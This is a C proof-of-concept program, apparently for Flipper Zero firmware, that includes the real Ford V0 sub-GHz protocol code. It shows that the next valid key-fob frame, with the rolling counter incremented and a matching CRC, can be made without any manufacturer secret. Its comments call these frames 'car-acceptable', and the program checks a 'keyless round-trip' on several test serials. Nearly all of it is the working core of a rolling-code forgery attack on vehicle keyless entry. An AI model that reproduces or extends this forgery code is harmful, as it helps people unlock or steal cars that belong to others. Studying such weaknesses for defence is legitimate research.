// Ford V0 keyless round-trip proof.
// Includes the REAL firmware ford_v0.c to reach its static decode/encode/predict
// (all keyless: no manufacturer secret anywhere). Proves:
//   decode(predict(serial,btn,cnt)) == (serial,btn,cnt)      [self-consistent]
//   decode(predict(serial,btn,cnt+1)) == (serial,btn,cnt+1)  [bumped counter]
//   CRC verifies on every synthesized frame                  [car-acceptable]
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <lib/subghz/protocols/base.h>
#include <lib/flipper_format/flipper_format.h>

// Pull in the real firmware translation unit (static fns become visible).
#include "lib/subghz/protocols/ford_v0.c"

int main(void) {
    struct { uint32_t serial; uint8_t btn; uint32_t cnt; } cases[] = {
        {0x1A2B3C4D, 0x02, 0x00010},
        {0xDEADBEEF, 0x04, 0x3FABC},
        {0x00012345, 0x08, 0x7FFFE},  // near 19-bit wrap
        {0xFFFFFFFF, 0x01, 0x00000},
    };
    int fail = 0, total = 0;
    uint8_t header = 0xA5; // arbitrary; decode ignores buf[0]

    for(unsigned i = 0; i < sizeof(cases)/sizeof(cases[0]); i++) {
        uint32_t sn = cases[i].serial, bc = cases[i].cnt; uint8_t bt = cases[i].btn;
        for(int step = 0; step <= 1; step++) {   // base, then bumped +1
            uint32_t cnt = (bc + step) & 0x7FFFF;
            uint64_t k1 = 0; uint16_t k2 = 0;
            ford_v0_predict_key(header, sn, bt, cnt, &k1, &k2); // synth next frame

            // Re-decode the synthesized 80-bit frame with the REAL decoder path.
            uint32_t d_sn = 0, d_cnt = 0; uint8_t d_bt = 0;
            decode_ford_v0(k1, k2, &d_sn, &d_bt, &d_cnt);
            bool crc = ford_v0_verify_crc(k1, k2);

            total++;
            int ok = (d_sn == sn) && (d_bt == bt) && (d_cnt == cnt) && crc;
            if(!ok) fail++;
            printf("[%s] sn=%08X btn=%X cnt=%05X -> key1=%016llX key2=%04X | "
                   "dec sn=%08X btn=%X cnt=%05X crc=%s => %s\n",
                   step ? "cnt+1" : "base ", sn, bt, cnt,
                   (unsigned long long)k1, k2, d_sn, d_bt, d_cnt,
                   crc ? "OK" : "BAD", ok ? "PASS" : "FAIL");
        }
    }
    printf("\nSUMMARY: %d/%d PASS%s\n", total - fail, total, fail ? "  <-- FAILURES" : " (keyless round-trip proven)");
    return fail ? 1 : 0;
}
